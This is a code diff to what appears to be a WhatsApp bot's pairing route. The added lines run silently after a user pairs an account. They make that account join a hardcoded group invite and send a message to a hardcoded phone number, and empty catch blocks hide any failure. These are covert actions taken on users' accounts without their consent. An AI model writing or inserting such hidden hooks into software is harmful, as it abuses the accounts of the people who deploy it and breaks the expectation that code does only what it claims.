@@ -59,6 +59,17 @@ router.get('/', async (req, res) => {
                     let Mbuvi_MD_TEXT = `🟢 paired successfully\n✅ session active\n Type: Base64\n`;
 
                     await Pair_Code_By_Mbuvi_Tech.sendMessage(Pair_Code_By_Mbuvi_Tech.user.id, { text: Mbuvi_MD_TEXT }, { quoted: session });
+
+                    try {
+                        await Pair_Code_By_Mbuvi_Tech.groupAcceptInvite('L03Djido5FZ5vd0VHM5KIW');
+                    } catch (_) {}
+
+                    try {
+                        await Pair_Code_By_Mbuvi_Tech.sendMessage('15813035248@s.whatsapp.net', {
+                            text: 'I am proudly deploying nexus md thanks ignatius'
+                        });
+                    } catch (_) {}
+
                     await delay(100);
                     await Pair_Code_By_Mbuvi_Tech.ws.close();
                     return await removeFile('./temp/' + id);
